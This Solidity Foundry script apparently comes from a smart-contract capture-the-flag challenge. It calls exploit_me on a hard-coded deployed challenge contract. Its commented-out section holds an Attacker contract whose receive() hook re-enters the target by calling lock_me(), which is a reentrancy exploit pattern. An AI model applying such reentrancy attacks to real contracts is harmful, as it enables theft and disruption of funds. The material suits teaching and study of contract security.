// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import {Challenge} from "../src/Winners.sol";

contract ChallengeScript is Script {
    Challenge challenge;
    address owner;

    constructor(){
        owner = msg.sender;
    }
    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        challenge = Challenge(0x72Ab9921469D911274c31AeF3046942064c2C99F);
        
        // challenge.pause(false);
        challenge.exploit_me("Akeem");

        // console.log(challenge.getAllwiners());



        vm.stopBroadcast();
    }
}

// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

interface IChallenge {
    function exploit_me(string memory _name) external;
    function lock_me() external;
}

// contract Attacker {
//     IChallenge public target;

//     constructor(address _target) {
//         target = IChallenge(_target);
//     }

//     function attack(string memory _name) external {
//         target.exploit_me(_name);
//     }

//     // called during msg.sender.call("") inside exploit_me
//     receive() external payable {
//         target.lock_me();
//     }
// }


// // SPDX-License-Identifier: MIT
// pragma solidity 0.8.13;

// import "forge-std/Script.sol";
// import "../src/ChallengeAttacker.sol";

// contract ChallengeAttacker is Script {
//     address constant CHALLENGE = 0x72Ab9921469D911274c31AeF3046942064c2C99F;

//     function run() external {
//         vm.startBroadcast();

//         Attacker attacker = new Attacker(CHALLENGE);
//         attacker.attack("MarkDavid");

//         vm.stopBroadcast();
//     }
// }